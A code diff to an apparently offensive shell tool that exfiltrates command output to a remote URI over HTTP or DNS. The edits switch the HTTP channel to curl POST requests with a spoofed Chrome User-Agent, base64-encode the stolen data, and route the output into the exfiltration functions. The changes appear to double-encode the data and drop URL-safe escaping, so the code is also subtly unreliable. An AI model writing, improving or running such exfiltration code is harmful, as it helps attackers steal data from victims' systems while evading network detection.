@@ -63,8 +63,8 @@ log() {
 encode_output() {
     local output=$1
     case $ENCODE in
-        b64)
-            echo "$output" | base64
+        b64|base64)
+            echo "$output" | base64 | tr -d '\n'
             ;;
         hex)
             echo "$output" | xxd -p
@@ -92,13 +92,24 @@ exfiltrate_http() {
         echo "No data to exfiltrate" >&2
         return 1
     fi
-    encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
-    local full_uri="$uri?d=$encoded_data"
+    
+    # Always base64 encode the data before exfiltration
+    local encoded_data=$(ENCODE=base64 encode_output "$data")
+    
+    # Use POST method for all data
     if [ "$VERBOSE" = true ]; then
-        echo "Exfiltrating data to $uri"
-        curl -v -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri"
+        echo "Exfiltrating data to $uri using POST"
+        curl -X POST "$uri" \
+             -H "Content-Type: application/x-www-form-urlencoded" \
+             -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
+             -d "d=$encoded_data" \
+             -v
     else
-        curl -s -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri" > /dev/null 2>&1
+        curl -X POST "$uri" \
+             -H "Content-Type: application/x-www-form-urlencoded" \
+             -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
+             -d "d=$encoded_data" \
+             -s
     fi
 }
 
@@ -246,15 +257,19 @@ main() {
     fi
 
     if [ -n "$output" ]; then
-        encoded_output=$(encode_output "$output")
+        if [ "$ENCODE" != "none" ]; then
+            # Apply the specified encoding
+            output=$(encode_output "$output")
+        fi
+
         if [ "$EXFIL" = true ]; then
             if [ "$EXFIL_METHOD" = "http" ]; then
-                exfiltrate_http "$encoded_output" "$EXFIL_URI"
+                exfiltrate_http "$output" "$EXFIL_URI"
             elif [ "$EXFIL_METHOD" = "dns" ]; then
-                exfiltrate_dns "$encoded_output" "$EXFIL_URI"
+                exfiltrate_dns "$output" "$EXFIL_URI"
             fi
         else
-            echo -e "$encoded_output"
+            echo -e "$output"
         fi
     fi
 }
